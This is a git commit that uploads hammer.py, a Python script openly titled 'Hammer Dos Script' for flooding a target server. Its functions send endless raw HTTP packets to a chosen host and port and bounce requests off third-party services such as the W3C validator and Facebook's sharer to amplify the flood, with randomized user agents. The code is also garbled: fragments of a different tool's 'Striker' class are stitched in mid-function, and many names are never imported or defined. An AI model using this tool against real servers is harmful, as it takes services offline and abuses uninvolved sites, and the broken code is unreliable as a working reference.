a72c7a8297e003f2c281033732ca19a568039f6e
hafiz <66164320+Lezgi480@users.noreply.github.com>
2023-05-28 21:33:01 +0300

    Add files via upload

---
+++ hammer.py
@@ -0,0 +1,213 @@
+#!/usr/bin/python3
+# -*- coding: utf-8 -*-
+
+# python 3.3.2+ Hammer Dos Script v.1
+# by Can Yalçın
+# only for legal purpose
+
+from multiprocessing import Process, Manager, Pool
+import urllib.parse, ssl
+import sys, getopt, random, time, os
+import http.client
+HTTPCLIENT = http.client
+
+USER_AGENT_PARTS = {
+    'os': {
+        'linux': {
+            'name': ['Linux x86_64', 'Linux i386'],
+            'ext': ['X11']
+        },
+        'windows': {
+            'name': ['Windows NT 6.1', 'Windows NT 6.3', 'Windows NT 5.1', 'Windows NT.6.2'],
+            'ext': ['WOW64', 'Win64; x64']
+        },
+        'mac': {
+            'name': ['Macintosh'],
+            'ext': ['Intel Mac OS X %d_%d_%d' % (random.randint(10, 11), random.randint(0, 9), random.randint(0, 5)) for i in range(1, 10)]
+        },
+    },
+    'platform': {
+        'webkit': {
+            'name': ['AppleWebKit/%d.%d' % (random.randint(535, 537), random.randint(1,36)) for i in range(1, 30)],
+            'details': ['KHTML, like Gecko'],
+            'extensions': ['Chrome/%d.0.%d.%d Safari/%d.%d' % (random.randint(6, 32), random.randint(100, 2000), random.randint(0, 100), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 30) ] + [ 'Version/%d.%d.%d Safari/%d.%d' % (random.randint(4, 6), random.randint(0, 1), random.randint(0, 9), random.randint(535, 537), random.randint(1, 36)) for i in range(1, 10)]
+        },
+        'iexplorer': {
+            'browser_info': {
+                'name': ['MSIE 6.0', 'MSIE 6.1', 'MSIE 7.0', 'MSIE 7.0b', 'MSIE 8.0', 'MSIE 9.0', 'MSIE 10.0'],
+                'ext_pre': ['compatible', 'Windows; U'],
+                'ext_post': ['Trident/%d.0' % i for i in range(4, 6) ] + [ '.NET CLR %d.%d.%d' % (random.randint(1, 3), random.randint(0, 5), random.randint(1000, 30000)) for i in range(1, 10)]
+            }
+        },
+        'gecko': {
+            'name': ['Gecko/%d%02d%02d Firefox/%d.0' % (random.randint(2001, 2010), random.randint(1,31), random.randint(1,12) , random.randint(10, 25)) for i in range(1, 30)],
+            'details': [],
+            'extensions': []
+        }
+    }
+}
+
+####
+#  Class Hammer
+####
+
+def my_bots():
+	global bots
+	bots=[]
+	bots.append("http://validator.w3.org/check?uri=")
+	bots.append("http://www.facebook.com/sharer/sharer.php?u=")
+	return(bots)
+
+
+def bot_hammering(url):
+	try:
+		while True:
+			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
+			print("\033[94mbot is hammering...\033[0m")
+			time.sleep(.1)
+	except:
+		time.sleep(.1)
+
+
+def down_it(item):
+	try:
+		while True:
+			packet = str("GET / HTTP/1.1\url: "+url+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((url,int(port)))
+			if s.sendto( packet, (url, int(port)) ):
+				s.shutdown(1)
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--packet sent! Dos--> \033[0m")
+			else:
+				s.shutdown(1)
+				print("\033[91mshut<->down\033[0m")
+			time.sleep(.1)
+	except socket.error as e:
+		print("\033[91mno connection! url maybe down\033[0m")
+		#print("\033[91m",e,"\033[0m")
+		time.sleep(.1)
+
+
+def dos():
+	while True:
+		item = q.get()
+		down_it(item)
+		q.task_done()
+
+
+def dos2():
+	while True:
+		item=w.get()
+		bot_hammering(random.choice(bots)+"http://"+url)
+		w.task_done()
+
+
+def usage():
+	print (''' \033[92m	Hammer Dos Script v.2
+	usage : python3 hammer.py [-s] [-p] [-t]
+	-h : help
+	-s : url
+	-p : port default 80
+	-t : turbo default 135 \033[0m''')
+	sys.exit()
+
+
+def get_parameters():
+	global host
+	global port
+	global thr
+	global item
+	optp = OptionParser(add_help_option=False,epilog="Hammers")
+	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
+	optp.add_option("-s","--url", dest="url",help="attack to server ip -s ip")
+	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
+	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
+	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
+	opts, args = optp.parse_args()
+	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
+	if opts.help:
+		usage()
+	if opts.host is not None:
+		host = opts.host
+	else:
+		usage()
+	if opts.port is None:
+		port = 80
+	else:
+		port = opts.port
+
+ # Options
+    method = METHOD_GET
+
+    def __init__(self, url, nr_sockets, counter):
+
+        super(Striker, self).__init__()
+
+        self.counter = counter
+        self.nr_socks = nr_sockets
+
+        parsedUrl = urllib.parse.urlparse(url)
+
+        if parsedUrl.scheme == 'https':
+            self.ssl = True
+
+        self.host = parsedUrl.netloc.split(':')[0]
+        self.url = parsedUrl.path
+
+        self.port = parsedUrl.port
+
+        if not self.port:
+            self.port = 80 if not self.ssl else 443
+
+# reading headers
+global data
+headers = open("headers.txt", "r")
+data = headers.read()
+headers.close()
+#task queue are q,w
+q = Queue()
+w = Queue()
+
+
+if __name__ == '__main__':
+	if len(sys.argv) < 2:
+		usage()
+	get_parameters()
+	print("\033[92m",url," port: ",str(port)," turbo: ",str(thr),"\033[0m")
+	print("\033[94mPlease wait...\033[0m")
+	user_agent()
+	my_bots()
+	time.sleep(5)
+	try:
+		                for i in range(self.nr_socks):
+
+                    if self.ssl:
+                        if SSLVERIFY:
+                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port)
+                        else:
+                            c = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context())
+                    else:
+                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)
+
+                    self.socks.append(c)
+
+                for conn_req in self.socks:
+
+                    (url, headers) = self.createPayload()
+
+                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
+
+                    conn_req.request(method.upper(), url, None, headers)
+
+                for conn_resp in self.socks:
+		#tasking
+		item = 0
+		while True:
+			if (item>1800): # for no memory crash
+				item=0
+				time.sleep(.1)
+			item = item + 1
+			q.put(item)
+			w.put(item)
+		q.join()
+		w.join()
